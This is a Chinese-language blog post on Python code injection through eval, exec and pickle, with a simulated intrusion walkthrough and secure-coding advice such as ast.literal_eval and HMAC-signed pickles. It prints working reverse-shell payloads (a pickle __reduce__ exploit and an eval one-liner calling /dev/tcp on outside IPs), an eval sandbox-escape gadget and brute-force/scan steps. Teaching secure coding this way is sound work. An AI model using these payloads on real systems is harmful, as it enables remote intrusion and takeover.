---
title: Python安全编码-代码注入的实践与防范
date: 2016-10-16
tags: 网络安全
id: 1
---


## 什么是代码注入
代码注入攻击指的是任何允许攻击者在网络应用程序中注入源代码，从而得到解读和执行的方法。

###Python中常见代码注入
能够执行一行任意字符串形式代码的eval()函数
```
>>> eval("__import__('os').system('uname -a')")
```
能够执行字符串形式代码块的exec()函数
```
>>> exec("__import__('os').system('uname -a')")
```
反序列化一个pickled对象时
```
>>> pickle.loads("cposix\nsystem\np0\n(S'uname -a'\np1\ntp2\nRp3\n.")
```
执行一个Python文件
```
>>> execfile("testf.py")
```

pickle.loads()代码注入
某不安全的用法：
```
def load_session(self, session_id=None):
    if not session_id:
        session_id = self.gen_session_id()
        session = Session(session_id, self)
    else:
        try:
            data = self.backend.get(session_id)
            if data:
                data = pickle.loads(data)
                assert type(data) == dict
            else:
                data = {}
        except:
            data = {}
        session = Session(session_id, self, data)
return session
```
注入的代码：
```
>>> import os
>>> import pickle
>>> class exp(object):
...     def __reduce__(self):
...         s = "/bin/bash -c \"/bin/bash -i > \/dev/tcp/192.168.42.62/12345 0<&1 2>&1 &\""
...         return (os.system, (s,))
...
>>> e = exp()
>>> e
<__main__.exp object at 0x7f734afa8790>
>>> k = pickle.dumps(e)
'cposix\nsystem\np0\n(S\'/bin/bash -c "/bin/bash -i > \\\\/dev/tcp/192.168.42.62/12345 0<&1 2>&1 &"\'\np1\ntp2\nRp3\n.'
 
>>> pickle.loads(k)
0
>>>
[3]+  Stopped                 python
```


### 这些函数使用不当都很危险
os.system
os.popen*
os.spawn*
os.exec*
os.open
os.popen*
commands.*
subprocess.popen
popen2.*

## 一次模拟的实践
通过这次实践发现系统中的诸多安全薄弱的环节，执行流程如下：
1. nmap扫描IP` nmap -v -A *.*.*.* -p 1-65535`，通过nmap扫描后会发现公开的服务。
2. 暴力破解登录名密码` test 123`，弱口令登陆系统。这个地方的薄弱点在于开发过程中容易留下便于程序员测试后门或若口令。
3. 成功登陆系统后寻找代码注入点，通过成功找到注入点后可执行代码注入通过反向shell连接服务器提权`eval("__import__('os').system('/bin/bash -c \"/bin/bash -i > /dev/tcp/10.10.10.130/12345 0<&1 2>&1 &\"')")`

todo 第三步在整个系统中发现了两个可进行代码注入的漏洞，第一个为pickl反序列化用户登录信息的时候没有做校验，这样当对应的存储介质（memcache、redis）没有开启登录认证并且暴漏在公网中很容易注入代码。第二个为在系统中一些配置直接使用eval函数执行配置中的Python代码进行注入。
todo 反向shell介绍

## 如何安全编码
1. 严格控制输入，过滤所有危险模块，遇到非法字符直接返回。
2. 使用ast.literal_eval()代替eval()
3. 安全使用pickle

下面就着几个点来说一下：

#### eval()方法注释：
```
eval(source[, globals[, locals]]) -> value
Evaluate the source in the context of globals and locals. The source may be a string representing a Python expression or a code object as returned by compile(). The globals must be a dictionary and locals can be any mapping, defaulting to the current globals and locals. If only globals is given, locals defaults to it.
```
 
#### ast.literal_eval()方法注释：
```
Safely evaluate an expression node or a string containing a Python expression.  The string or node provided may only consist of the following Python literal structures: strings, numbers, tuples, lists, dicts, booleans, and None.
```


#### 使用ast.literal_eval()代替eval()对比：

```
ast.literal_eval("1+1")  # ValueError: malformed string
ast.literal_eval("[1, 2, 3]")  # [1, 2, 3]
ast.literal_eval("{1: 1, 2: 2, 3: 3}")  # {1: 1, 2: 2, 3: 3}
ast.literal_eval("__import__('os').system('uname -a')")  # ValueError: malformed string
eval("__import__('os').system('uname -a')")  # Linux zhangxu-ThinkPad-T450 3.13.0-92-generic #139-Ubuntu SMP Tue Jun 28 20:42:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
eval("__import__('os').system('uname -a')", {}, {})  # Linux zhangxu-ThinkPad-T450 3.13.0-92-generic #139-Ubuntu SMP Tue Jun 28 20:42:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
eval("__import__('os').system('uname -a')", {"__builtins__": {}}, {})  # NameError: name '__import__' is not defined
```

#### eval禁用全局或本地变量：

```
>>> global_a = "Hello Eval!"
>>> eval("global_a")
>>> eval("global_a", {}, {})
```


#### 寻找eval的突破点

`eval("[c for c in ().__class__.__bases__[0].__subclasses__()]", {'__builtins__':{}})`

参考点：
```
(
    lambda fc=(
        lambda n: [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == n][0]
    ):
    fc("function")(
        fc("code")(
            0, 0, 0, 0, "KABOOM", (), (), (), "", "", 0, ""),
        {})()
)()
```

#### 安全使用pickle

```
>>> import hmac
>>> import hashlib
>>> import pickle
>>> shared_key = '123456'
>>> class Exp(object):
...     def __reduce__(self):
...         s = "__import__('os').system('uname -a')"
...         return (os.system, (s,))
...
>>> e = Exp()
>>> s = pickle.dumps(e)
>>> s
'cposix\nsystem\np0\n(S"__import__(\'os\').system(\'uname -a\')"\np1\ntp2\nRp3\n.'
>>> k = hmac.new(shared_key, s, hashlib.sha1).hexdigest()
>>> k
'20bc7b14ee6d2f8109c0fc0561df3db40203622d'
>>> send_s = k + ' ' + s
>>> send_s
'20bc7b14ee6d2f8109c0fc0561df3db40203622d cposix\nsystem\np0\n(S"__import__(\'os\').system(\'uname -a\')"\np1\ntp2\nRp3\n.'
>>> recv_k, recv_s = send_s.split(' ', 1)
>>> recv_k, recv_s
('20bc7b14ee6d2f8109c0fc0561df3db40203622d', 'cposix\nsystem\np0\n(S"__import__(\'os\').system(\'uname -a\')"\np1\ntp2\nRp3\n.')
>>> new_k = hmac.new(shared_key, recv_s, hashlib.sha1).hexdigest()
>>> new_k
'20bc7b14ee6d2f8109c0fc0561df3db40203622d'
>>> diff_k = hmac.new(shared_key + "123456", recv_s, hashlib.sha1).hexdigest()
>>> diff_k
'381542893003a30d045c5c729713d2aa428128de'
>>>
```

### 如何提高安全编码意识？


### 参考资料

http://www.programcreek.com/python/example/5578/ast.literal_eval
https://segmentfault.com/a/1190000002783940
http://www.yunweipai.com/archives/6540.html
http://blog.csdn.net/chence19871/article/details/32718219
http://coolshell.cn/articles/8711.html
http://stackoverflow.com/questions/15197673/using-pythons-eval-vs-ast-literal-eval
https://www.cigital.com/blog/python-pickling/
https://github.com/greysign/pysec/blob/master/safeeval.py

### 附录

#### nmap扫描部分结果

What is nmap?
Nmap (Network Mapper) is a security scanner originally written by Gordon Lyon used to discover hosts and services on a computer network, thus creating a "map" of the network.
 
-A: Enable OS detection, version detection, script scanning, and traceroute
-v: Increase verbosity level (use -vv or more for greater effect)
-p <port ranges>: Only scan specified ports
```
root@bt:~# nmap -v -A *.*.*.* -p 1-65535 
Starting Nmap 6.25 ( http://nmap.org ) at 2016-07-26 13:30 EDT
......
Not shown: 65527 filtered ports
PORT      STATE  SERVICE     VERSION
139/tcp   open   netbios-ssn
1723/tcp  open   pptp        Microsoft
8891/tcp  open   http        nginx 1.4.4
9090/tcp  closed zeus-admin
13228/tcp open   http        Microsoft IIS httpd 7.5
14580/tcp closed unknown
36666/tcp open   unknown
64380/tcp open   unknown
......
Device type: general purpose|storage-misc
Running (JUST GUESSING): Linux 2.4.X (99%), Microsoft Windows 7 (95%), BlueArc embedded (91%)
OS CPE: cpe:/o:linux:linux_kernel:2.4 cpe:/o:microsoft:windows_7:::enterprise cpe:/h:bluearc:titan_2100
Aggressive OS guesses: DD-WRT v24-sp2 (Linux 2.4.37) (99%), Microsoft Windows 7 Enterprise (95%), BlueArc Titan 2100 NAS device (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
......
NSE: Script Post-scanning.
Read data files from: /usr/local/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 895.44 seconds
           Raw packets sent: 262711 (11.560MB) | Rcvd: 55220 (2.209MB)
```
Links：
http://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
 

#### 反向Shell
http://os.51cto.com/art/201312/424378.htm


